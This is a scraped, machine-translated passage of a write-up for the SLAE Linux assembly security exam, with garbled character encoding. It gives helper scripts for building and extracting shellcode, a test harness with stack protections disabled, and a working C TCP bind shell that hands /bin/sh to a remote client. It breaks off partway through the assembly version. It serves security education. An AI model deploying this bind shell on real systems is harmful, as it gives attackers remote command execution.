<!doctype html>
<html class="no-js" lang="zh-CN">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ’“ ğŸ’© ğŸ‘©â€â¤ï¸â€ğŸ’‹â€ğŸ‘© SLAE-å®‰å…¨æ€§Linuxç»„è£…ä¸“å®¶è€ƒè¯• ğŸ“¨ ğŸŒ­ ğŸ‘©â€ğŸ“</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="å®‰å…¨æ€§Linuxæ±‡ç¼–ä¸“å®¶-åœ¨ä¿¡æ¯å®‰å…¨çš„èƒŒæ™¯ä¸‹ï¼Œæœ‰å…³Linuxç³»ç»Ÿä¸­Intelå¤„ç†å™¨å®¶æ—çš„32ä½æ±‡ç¼–è¯­è¨€çš„åŸºç¡€çŸ¥è¯†çš„åœ¨çº¿è¯¾ç¨‹å’Œè€ƒè¯•ã€‚æœ¬è¯¾ç¨‹å¯¹æ¸—é€æµ‹è¯•äººå‘˜ï¼Œä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆä»¥åŠä»»ä½•æƒ³äº†è§£æ±‡ç¼–ç¨‹åºåŸºç¡€çŸ¥è¯†å¹¶å­¦ä¹ å¦‚ä½•ç¼–å†™ç®€å•Shellcodeçš„äººéƒ½éå¸¸æœ‰ç”¨ã€‚å®Œæˆæœ¬è¯¾ç¨‹åï¼Œæ‚¨å°†å­¦ä¹ å¦‚ä½•ä½¿ç”¨åŸºæœ¬çš„Linuxç³»ç»Ÿè°ƒ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>SLAE-å®‰å…¨æ€§Linuxç»„è£…ä¸“å®¶è€ƒè¯•</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/488416/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/nj/sc/fb/njscfbnkoirqggp_ns8h9upvies.png" alt="å›¾ç‰‡"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å®‰å…¨æ€§Linuxæ±‡ç¼–ä¸“å®¶-åœ¨ä¿¡æ¯å®‰å…¨çš„èƒŒæ™¯ä¸‹ï¼Œæœ‰å…³Linuxç³»ç»Ÿä¸­Intelå¤„ç†å™¨å®¶æ—çš„32ä½æ±‡ç¼–è¯­è¨€çš„åŸºç¡€çŸ¥è¯†çš„åœ¨çº¿è¯¾ç¨‹å’Œè€ƒè¯•ã€‚</font><font style="vertical-align: inherit;">æœ¬è¯¾ç¨‹å¯¹æ¸—é€æµ‹è¯•äººå‘˜ï¼Œä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆä»¥åŠä»»ä½•æƒ³äº†è§£æ±‡ç¼–ç¨‹åºåŸºç¡€çŸ¥è¯†å¹¶å­¦ä¹ å¦‚ä½•ç¼–å†™ç®€å•Shellcodeçš„äººéƒ½éå¸¸æœ‰ç”¨ã€‚</font><font style="vertical-align: inherit;">å®Œæˆæœ¬è¯¾ç¨‹åï¼Œæ‚¨å°†å­¦ä¹ å¦‚ä½•ä½¿ç”¨åŸºæœ¬çš„Linuxç³»ç»Ÿè°ƒç”¨ï¼Œç¼–å†™ç®€å•çš„shellcodeå¹¶å¼€å§‹åœ¨å†…æ ¸çº§åˆ«ç†è§£æ“ä½œç³»ç»Ÿçš„åŸºæœ¬åŸç†ã€‚</font><font style="vertical-align: inherit;">æœ¬æ–‡å°†ä»‹ç»é€šè¿‡æœ¬</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¯¾ç¨‹</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è€ƒè¯•æ‰€éœ€çš„ä»»åŠ¡</font><font style="vertical-align: inherit;">ã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ ¹æ®è€ƒè¯•æ¡ä»¶ï¼Œæ‚¨å¿…é¡»å®Œæˆ7ä¸ªä»»åŠ¡ï¼š</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç¼–å†™TCPç»‘å®šå¤–å£³</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç¼–å†™åå‘TCP Shell</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å¤„ç†EgghunteræŠ€æœ¯å¹¶æä¾›æ­¤æŠ€æœ¯çš„ç¤ºä¾‹</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç¼–å†™ä»£ç ç¼–ç å™¨</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä½¿ç”¨GDB / ndisasm / libemuåˆ†æmsfvenomç”Ÿæˆçš„3ä¸ªshellcode</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å¯¹3ä¸ªä»»ä½•shellcodeå’Œshellstormæ‰§è¡Œå¤šæ€è½¬æ¢ã€‚</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç¼–å†™ä»£ç åŠ å¯†å™¨</font></font></li>
</ol><a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ¯ä¸ªä»»åŠ¡éƒ½éœ€è¦è¿›è¡Œæ³¨é‡Šï¼Œè¿˜éœ€è¦æä¾›å¤„ç†å®ƒä»¬çš„è¿‡ç¨‹çš„å±å¹•æˆªå›¾ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬ä»å‡†å¤‡å¼€å§‹ã€‚</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è®­ç»ƒ</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è‡ªåŠ¨åŒ–æ˜¯æˆ‘ä»¬çš„ä¸€åˆ‡ï¼Œå› æ­¤åœ¨ç»§ç»­æ‰§è¡Œä»»åŠ¡ä¹‹å‰ï¼Œæ‚¨éœ€è¦æè¿°ç”¨äºç²¾é€šè¯¾ç¨‹å’Œé€šè¿‡è€ƒè¯•çš„è„šæœ¬ã€‚</font><font style="vertical-align: inherit;">å®ƒä»¬å°†å¸®åŠ©æ‚¨èŠ‚çœæ—¶é—´å’Œç²¾åŠ›ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm32.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage ./nasm32 &lt;nasmMainFile&gt; (no extension)"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
<span class="hljs-keyword">if</span> [ ! -e <span class="hljs-string">"<span class="hljs-variable">$1</span>.asm"</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error, <span class="hljs-variable">$1</span>.asm not found."</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note, do not enter file extensions"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
nasm -f elf <span class="hljs-variable">$1</span>.asm -o <span class="hljs-variable">$1</span>.o<font></font>
ld -m elf_i386 -o <span class="hljs-variable">$1</span> <span class="hljs-variable">$1</span>.o</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¯¥è„šæœ¬ç”¨äºå¿«é€Ÿç¼–è¯‘å’Œé“¾æ¥.asmæ–‡ä»¶ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">popcode.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
target=<span class="hljs-variable">$1</span><font></font>
<font></font>
objdump -D -M intel <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> | grep <span class="hljs-string">'[0-9a-f]:'</span> | grep -v <span class="hljs-string">'file'</span> | cut -f2 -d: | cut -f1-7 -d<span class="hljs-string">' '</span> | tr -s <span class="hljs-string">' '</span> | tr <span class="hljs-string">'\t'</span> <span class="hljs-string">' '</span> | sed <span class="hljs-string">'s/ $//g'</span> | sed <span class="hljs-string">'s/ /\\x/g'</span> | paste -d <span class="hljs-string">''</span> -s</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬å°†ä½¿ç”¨æ­¤è„šæœ¬ä»¥åå…­è¿›åˆ¶æ ¼å¼æ‰“å°ä»£ç ï¼Œå¹¶åœ¨æ¯ä¸ªå­—ç¬¦ä¹‹å‰æ‰“å°â€œ \ xâ€ã€‚</font><font style="vertical-align: inherit;">è¿™æ˜¯å°†æˆ‘ä»¬çš„shellcodeæ’å…¥Cæ–‡ä»¶æ‰€å¿…éœ€çš„ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hexopcode.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
target=<span class="hljs-variable">$1</span><font></font>
<font></font>
objdump -D -M intel <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> | grep <span class="hljs-string">'[0-9a-f]:'</span> | grep -v <span class="hljs-string">'file'</span> | cut -f2 -d: | cut -f1-7 -d<span class="hljs-string">' '</span> | tr -s <span class="hljs-string">' '</span> | tr <span class="hljs-string">'\t'</span> <span class="hljs-string">' '</span> | sed <span class="hljs-string">'s/ $//g'</span> | sed <span class="hljs-string">'s/ /\\x/g'</span> | paste -d <span class="hljs-string">''</span> -s | sed -e <span class="hljs-string">'s!\\x!!g'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ­¤å¤„çš„æ‰€æœ‰å†…å®¹ä¸ä¸Šé¢çš„è„šæœ¬ç›¸åŒï¼Œä»…æ‰“å°ä»£ç æ—¶ä¸å¸¦â€œ \ xâ€ã€‚</font><font style="vertical-align: inherit;">å°†åå…­è¿›åˆ¶ä»£ç ä¼ é€’åˆ°ä»¥ä¸‹è„šæœ¬æ‰€éœ€ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hex2stack.py</font></font></b><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys<font></font>
<font></font>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
	<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
		print(<span class="hljs-string">"Enter opcode in hex"</span>)<font></font>
		sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
	string = sys.argv[<span class="hljs-number">1</span>]<font></font>
<font></font>
	reversed = [string[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(string),<span class="hljs-number">2</span>)][::<span class="hljs-number">-1</span>]<font></font>
<font></font>
	l = len(reversed) % <span class="hljs-number">4</span>
	<span class="hljs-keyword">if</span> l:<font></font>
		print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">"90"</span>*(<span class="hljs-number">4</span>-l) + <span class="hljs-string">""</span>.join(reversed[<span class="hljs-number">0</span>:l]))<font></font>
<font></font>
	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> range(l, len(reversed[l:]), <span class="hljs-number">4</span>):<font></font>
		print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">""</span>.join(reversed[p:p+<span class="hljs-number">4</span>]))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä¸ºäº†ä½¿ä»£ç æ˜“äºä½¿ç”¨ï¼Œå¯ä»¥å°†å…¶å‹å…¥å †æ ˆã€‚</font><font style="vertical-align: inherit;">ä½¿ç”¨</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">push</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å‘½ä»¤ä»¥ç›¸åçš„é¡ºåºå°†æ•°æ®å‹å…¥å †æ ˆ</font><font style="vertical-align: inherit;">ã€‚</font><font style="vertical-align: inherit;">ä¸Šé¢çš„è„šæœ¬å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå †æ ˆã€‚</font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä¾‹ï¼š</font></font></i><br>
<br>
<pre><code class="plaintext hljs">$./stack_shell.py 31c0506a68682f626173682f62696e89e35089c25389e1b00bcd80<font></font>
	push 0x9080cd0b<font></font>
	push 0xb0e18953<font></font>
	push 0xc28950e3<font></font>
	push 0x896e6962<font></font>
	push 0x2f687361<font></font>
	push 0x622f6868<font></font>
	push 0x6a50c031</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uscompile.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage ./compile &lt;cFile&gt; (no extension)"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
<span class="hljs-keyword">if</span> [ ! -e <span class="hljs-string">"<span class="hljs-variable">$1</span>.c"</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error, <span class="hljs-variable">$1</span>.c not found."</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note, do not enter file extensions"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
gcc -masm=intel -m32 -ggdb -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o <span class="hljs-variable">$1</span> <span class="hljs-variable">$1</span>.c</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¯¥è„šæœ¬ç¼–è¯‘å…·æœ‰ç¦ç”¨å †æ ˆä¿æŠ¤çš„Cæ–‡ä»¶ã€‚</font><font style="vertical-align: inherit;">å‡ºäºæ•™è‚²ç›®çš„ç¦ç”¨ä¿æŠ¤ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode.c</font></font></b><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> code[] =
<span class="hljs-string">""</span>;<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Shellcode Length:  %d\n"</span>, <span class="hljs-built_in">strlen</span>(code));
        <span class="hljs-keyword">int</span> (*ret)() = (<span class="hljs-keyword">int</span>(*)())code;<font></font>
        ret();<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cæ–‡ä»¶æœ¬èº«ï¼Œæˆ‘ä»¬åœ¨å…¶ä¸­æ”¾ç½®äº†shellcodeã€‚</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä»»åŠ¡</font></font></h3><br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.ç¼–å†™TCPç»‘å®šå¤–å£³</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬å°†ç¼–å†™æœ€ç®€å•çš„TCP-bind shellï¼Œå› æ­¤åœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œé¡ºåºå¦‚ä¸‹ï¼š</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘ä»¬ä½¿ç”¨socketï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼›åˆ›å»ºåï¼Œå°†è·å¾—ä¸€ä¸ªå¥—æ¥å­—æè¿°ç¬¦ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°å­—ï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å¯¹äºåˆ›å»ºçš„å¥—æ¥å­—ï¼Œé…ç½®å‚æ•°-åè®®ï¼Œâ€œç›‘å¬â€çš„åœ°å€ï¼Œç«¯å£-å¹¶è¿›è¡Œbindï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨ï¼Œè¯¥è°ƒç”¨å°†æŠŠå¥—æ¥å­—å›ºå®šä¸ºæŒ‡å®šçš„å‚æ•°ï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç„¶åè°ƒç”¨listenï¼ˆï¼‰-å¥—æ¥å­—â€œç›‘å¬â€ä¼ å…¥çš„è¿æ¥ï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä»…å¬è¿æ¥æ˜¯ä¸å¤Ÿçš„ï¼Œå¿…é¡»æ¥å—å®ƒä»¬ï¼Œå› æ­¤-acceptï¼ˆï¼‰;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å®¢æˆ·è¿æ¥åˆ°æˆ‘ä»¬ä¹‹åï¼Œæœ‰å¿…è¦å°†è¾“å…¥ï¼Œè¾“å‡ºå’Œé”™è¯¯çš„æ ‡å‡†æè¿°ç¬¦é‡å®šå‘åˆ°å®¢æˆ·ï¼šä½¿ç”¨dup2ï¼ˆï¼‰å¤åˆ¶å®ƒä»¬ï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æœ€åï¼šæˆ‘ä»¬å°†è°ƒç”¨å‘½ä»¤å¤–å£³ï¼Œå®¢æˆ·ç«¯å°†åœ¨å…¶ä¸­æ‰§è¡Œå‘½ä»¤ã€‚</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨ç»§ç»­ç¼–å†™æ±‡ç¼–ä»£ç ä¹‹å‰ï¼Œç”¨Cå®ç°ä¸Šè¿°ç¤ºä¾‹å°†éå¸¸æœ‰ç”¨ã€‚</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
    <span class="hljs-keyword">int</span> clientfd, sockfd;
    <span class="hljs-keyword">int</span> port = <span class="hljs-number">1234</span>;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">mysockaddr</span>;</span><font></font>
<font></font>
    <span class="hljs-comment">// AF_INET - IPv4, SOCK_STREAM - TCP, 0 - most suitable protocol</span>
    <span class="hljs-comment">// AF_INET = 2, SOCK_STREAM = 1</span>
    <span class="hljs-comment">// create socket, save socket file descriptor in sockfd variable</span>
    sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<font></font>
<font></font>
    <span class="hljs-comment">// fill structure</span>
    mysockaddr.sin_family = AF_INET; <span class="hljs-comment">// can be represented in numeric as 2</span><font></font>
    mysockaddr.sin_port = htons(port);<font></font>
    <span class="hljs-comment">//mysockaddr.sin_addr.s_addr = INADDR_ANY;// can be represented in numeric as 0 which means to bind to all interfaces</span>
    mysockaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"192.168.0.106"</span>);
    <span class="hljs-comment">// size of this array is 16 bytes</span>
    <span class="hljs-comment">//printf("size of mysockaddr: %lu\n", sizeof(mysockaddr));</span>
    <span class="hljs-comment">// executing bind() call</span>
    bind(sockfd, (struct sockaddr *) &amp;mysockaddr;, <span class="hljs-keyword">sizeof</span>(mysockaddr));
    <span class="hljs-comment">// listen()</span>
    listen(sockfd, <span class="hljs-number">1</span>);
    <span class="hljs-comment">// accept()</span>
    clientfd = accept(sockfd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-comment">// duplicate standard file descriptors in client file descriptor</span>
    dup2(clientfd, <span class="hljs-number">0</span>);<font></font>
    dup2(clientfd, <span class="hljs-number">1</span>);<font></font>
    dup2(clientfd, <span class="hljs-number">2</span>);
    <span class="hljs-comment">// and last: execute /bin/sh. All input and ouput of /bin/sh will translated via TCP connection</span>
    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[] = {<span class="hljs-string">"sh"</span>,<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>};<font></font>
    execve(<span class="hljs-string">"/bin/sh"</span>, argv, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ˜¯æ—¶å€™å°†æˆ‘ä»¬çš„ä»£ç ç§»æ¤åˆ°æ±‡ç¼–ç¨‹åºäº†ã€‚</font><font style="vertical-align: inherit;">è¦äº†è§£æ¯ä¸ªè°ƒç”¨ä¸ä»…æ¥å—å“ªäº›å‚æ•°ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹å®ƒä»¬çš„æŒ‡å—ï¼šman &lt;call&gt;ã€‚</font><font style="vertical-align: inherit;">æœ‰æ—¶ï¼Œä¸€ä¸ªåç§°å¯èƒ½æœ‰å¤šä¸ªå‚è€ƒæ‰‹å†Œã€‚</font><font style="vertical-align: inherit;">åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ï¼šapropos &lt;call&gt;ã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä¹‹åï¼šman &lt;æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ‰‹å†Œç¼–å·&gt; &lt;call&gt;ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
æˆ‘ä»¬</font><b><font style="vertical-align: inherit;">å‡†å¤‡å¯„å­˜å™¨</font></b><font style="vertical-align: inherit;">æˆ‘ä»¬ä¸çŸ¥é“åœ¨å¼€å§‹ä½¿ç”¨å®ƒä»¬æ—¶å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬å°†å®ƒä»¬é‡ç½®ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	xor eax, eax<font></font>
	xor ebx, ebx<font></font>
	xor esi, esi</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
åœ¨x86ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Œæ²¡æœ‰ç›´æ¥è°ƒç”¨socketï¼ˆï¼‰ã€‚</font><font style="vertical-align: inherit;">æ‰€æœ‰è°ƒç”¨éƒ½æ˜¯é€šè¿‡socketcallï¼ˆï¼‰æ–¹æ³•é—´æ¥è¿›è¡Œçš„ã€‚</font><font style="vertical-align: inherit;">è¯¥è°ƒç”¨æœ‰2ä¸ªå‚æ•°ï¼šå¥—æ¥å­—è°ƒç”¨å·å’ŒæŒ‡å‘å…¶å‚æ•°çš„æŒ‡é’ˆã€‚</font><font style="vertical-align: inherit;">å¯ä»¥åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¯èƒ½çš„å¥—æ¥å­—è°ƒç”¨çš„åˆ—è¡¨ï¼š/usr/include/linux/net.h</font></font><br>
<br>
<pre><code class="plaintext hljs">	; creating socket. 3 args<font></font>
	push esi	; 3rd arg, choose default proto<font></font>
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP<font></font>
	push 0x2	; 1st arg, 2 means Internet family proto<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102	; socketcall<font></font>
	mov bl, 1	; 1 = socket()<font></font>
	mov ecx, esp	; pointer to args of socket()<font></font>
	int 0x80<font></font>
	; in eax socket file descriptor. Save it<font></font>
	mov edx, eax</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.æŒ‡å®šåˆ›å»ºçš„å¥—æ¥å­—çš„å‚æ•°ï¼Œç„¶åæ‰§è¡Œbindï¼ˆï¼‰ã€‚</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä¸‹å›¾æ˜¾ç¤ºäº†å¦‚ä½•å°†å¥—æ¥å­—å‚æ•°å‹å…¥å †æ ˆã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä¸å¾—ä¸èŠ±ä¸€äº›æ—¶é—´æ¥å¼„æ¸…æ¥šå¥—æ¥å­—å‚æ•°ä»¥ä»€ä¹ˆå½¢å¼æ”¾åœ¨å †æ ˆä¸­ï¼š</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wg/zx/xb/wgzxxblapjjafqugqngl61pc_7y.png" alt="å›¾ç‰‡"><br>
<br>
<pre><code class="plaintext hljs">	; creating sockaddr_in addr struct for bind<font></font>
	push esi		; address, 0 - all interfaces<font></font>
	push WORD 0xd204	; port 1234.<font></font>
	push WORD 2		; AF_INET<font></font>
	mov ecx, esp		; pointer to sockaddr_in struct<font></font>
	push 0x16		; size of struct<font></font>
	push ecx		; pushing pointer to struct<font></font>
	push edx		; pushing socket descriptor<font></font>
	; socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 2		; bind()<font></font>
	mov ecx, esp<font></font>
	int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¦æ›´æ”¹ç«¯å£ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 -c "import socket; print(hex(socket.htons(&lt;int:port&gt;)))"
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¦‚æœè¦æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„åœ°å€ï¼Œæˆ‘ä»¬çš„å¥—æ¥å­—å°†åœ¨è¯¥åœ°å€ä¸Šä¾¦å¬ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 -c 'import ipaddress; d = hex(int(ipaddress.IPv4Address("&lt;IPv4 address&gt;"))); print("0x"+"".join([d[i:i+2] for i in range(0,len(d),2)][1:][::-1]))'</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.è°ƒç”¨listenï¼ˆï¼‰</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; creating listen<font></font>
	push 1<font></font>
	push edx<font></font>
